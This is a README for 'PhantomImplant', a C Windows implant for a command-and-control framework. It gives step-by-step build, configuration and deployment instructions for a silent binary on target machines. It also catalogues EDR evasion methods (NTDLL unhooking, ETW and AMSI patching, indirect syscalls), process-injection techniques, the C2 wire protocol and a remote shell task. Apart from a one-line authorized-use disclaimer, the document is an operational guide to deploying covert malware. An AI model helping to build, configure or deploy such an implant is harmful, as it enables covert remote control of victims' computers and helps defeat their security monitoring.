# PhantomImplant

Native C Windows implant for [Phantom C2](https://github.com/phantom-offensive/phantom). 325 KB, zero console output, EDR evasion built-in.

## Quick Start

```bash
# 1. Clone
git clone https://github.com/phantom-offensive/PhantomImplant.git
cd PhantomImplant

# 2. Configure (edit src/main.c)
#    - Set C2_SERVER_URL to your Phantom server
#    - Embed your server's RSA public key

# 3. Build
make release    # Silent implant (no console window)
make debug      # Test mode (with console output)

# 4. Deploy
# Copy build/phantom-implant.exe to target
```

## Building From Scratch

### Prerequisites (WSL/Kali Linux)

```bash
sudo apt update
sudo apt install -y mingw-w64 nasm
```

### Step 1: Configure the Implant

Edit `src/main.c` and set your C2 server details:

```c
#define C2_SERVER_URL   "https://YOUR_C2_SERVER:443"  // Your Phantom listener
#define C2_SLEEP_MS     10000                          // Check-in interval (ms)
#define C2_JITTER_PCT   20                             // Jitter percentage
#define C2_KILL_DATE    "2026-12-31"                   // Auto-terminate date (or "" for none)
```

### Step 2: Embed Your Server's RSA Public Key

Extract the DER bytes from your Phantom server's public key:

```bash
# On your Phantom C2 server:
cd ~/phantom

# Method 1: Python
python3 -c "
import base64
with open('configs/server.pub') as f:
    lines = f.readlines()
b64 = ''.join(l.strip() for l in lines if not l.startswith('---'))
der = base64.b64decode(b64)
arr = ', '.join(f'0x{b:02X}' for b in der)
print(f'static const BYTE g_ServerPubKeyDer[] = {{{arr}}};')
print(f'static const DWORD g_dwServerPubKeyDerLen = {len(der)};')
"

# Method 2: OpenSSL + xxd
openssl rsa -pubin -in configs/server.pub -outform DER 2>/dev/null | xxd -i
```

Paste the output into `src/main.c`, replacing the existing `g_ServerPubKeyDer[]` array.

### Step 3: Build

```bash
# Debug build (console output, for testing)
make debug
# Output: build/phantom-implant-debug.exe

# Release build (silent, no console window, stripped)
make release
# Output: build/phantom-implant.exe
```

### Step 4: Start Phantom C2 Server

```bash
cd ~/phantom
./build/phantom-server
# Login, start HTTP/HTTPS listener
# Verify: curl http://YOUR_IP:8080/ should return decoy response
```

### Step 5: Deploy and Run

```
# On target Windows machine:
phantom-implant.exe          # Release: runs silently, no window
phantom-implant-debug.exe    # Debug: shows test output + C2 status
phantom-implant-debug.exe --loop   # Debug: enters C2 callback loop
```

## Build Modes

| Mode | Command | Console | Window | Use |
|------|---------|---------|--------|-----|
| **Debug** | `make debug` | Yes (printf) | Console window | Development, testing |
| **Release** | `make release` | None | No window (WinMain) | Operations |

## What Happens When It Runs

### Release Mode (Silent)
1. Initializes indirect syscalls (HellsHall)
2. Runs EDR evasion: NTDLL unhook → ETW patch → AMSI bypass
3. Registers with C2 (RSA key exchange)
4. Enters check-in loop (sleep with jitter)
5. Executes tasks from server, reports results

### Debug Mode
Same as release but with verbose console output showing each step's result.

## Architecture

```
PhantomImplant/
├── include/
│   ├── common.h        # Types, hashes, config macros, DEBUG_MODE toggle
│   ├── api.h           # GetProcAddressH + GetModuleHandleH
│   ├── syscalls.h      # HellsHall indirect syscalls
│   ├── crypto.h        # XOR + AES-256-CBC
│   ├── injection.h     # 5 injection techniques
│   ├── transport.h     # C2 protocol structures
│   ├── msgpack.h       # Msgpack decoder
│   ├── evasion.h       # NTDLL unhook + ETW + AMSI bypass
│   └── strings.h       # XOR-encrypted strings
├── src/
│   ├── main.c          # Entry point (debug test harness + release WinMain)
│   ├── api.c           # PEB walking, PE export table, Jenkins hashing
│   ├── syscalls.c      # Hell's Gate + TartarusGate + indirect syscalls
│   ├── crypto.c        # XOR (3 variants) + AES-256-CBC/GCM (bCrypt)
│   ├── injection.c     # Classic, Syscall, Early Bird APC, Local
│   ├── transport.c     # WinHTTP C2, Phantom protocol (RSA+AES+msgpack)
│   ├── msgpack.c       # Msgpack parser (hash-based field matching)
│   ├── evasion.c       # NTDLL unhook + ETW patch + AMSI bypass
│   └── hashgen.c       # Standalone hash generator utility
├── asm/
│   └── syscalls.asm    # NASM x64 indirect syscall stubs
├── Makefile            # debug/release/hashgen targets
└── README.md
```

## Evasion Techniques

| Technique | What It Does | Detection Risk |
|-----------|-------------|----------------|
| API Hashing | Resolves functions by hash, nothing in IAT | Low |
| Indirect Syscalls | Executes syscall from ntdll's memory space | Low |
| String Encryption | XOR-encrypted C2 endpoints, field names | Low |
| NTDLL Unhooking | Maps clean ntdll, overwrites hooked .text | Medium |
| ETW Bypass | Patches EtwEventWrite + NtTraceEvent SSN | Medium |
| AMSI Bypass | Patches AmsiOpenSession + AmsiScanBuffer | Medium |

## Phantom C2 Protocol

```
Registration:  RSA-OAEP-SHA256([AES key + msgpack sysinfo]) → POST /api/v1/auth
Check-in:      AES-256-GCM(msgpack({agent_id, results}))    → POST /api/v1/status
Wire format:   {"data":"<base64([Ver][Type][KeyID][Len][Payload])>","ts":<unix>}
```

## Supported Tasks

| Task | Type ID | Description |
|------|---------|-------------|
| shell | 1 | Execute cmd command, return output |
| sysinfo | 7 | Return hostname, user, OS, arch, PID, IP |
| sleep | 8 | Update check-in interval |
| kill | 9 | Self-terminate |
| evasion | 16 | Re-run all evasion techniques |

## MSVC Build (Windows)

```cmd
ml64 /c /Fo build\syscalls.obj asm\syscalls.asm
cl /O2 /Iinclude src\*.c build\syscalls.obj /Fe:build\phantom-implant.exe ^
   /link bcrypt.lib winhttp.lib crypt32.lib ntdll.lib /SUBSYSTEM:WINDOWS
```

## Regenerating API Hashes

If you change the hash seed in `common.h`:

```bash
make gen-hashes
# Copy output into include/common.h
```

## Disclaimer

For authorized red team engagements and security research only. Unauthorized use is illegal.
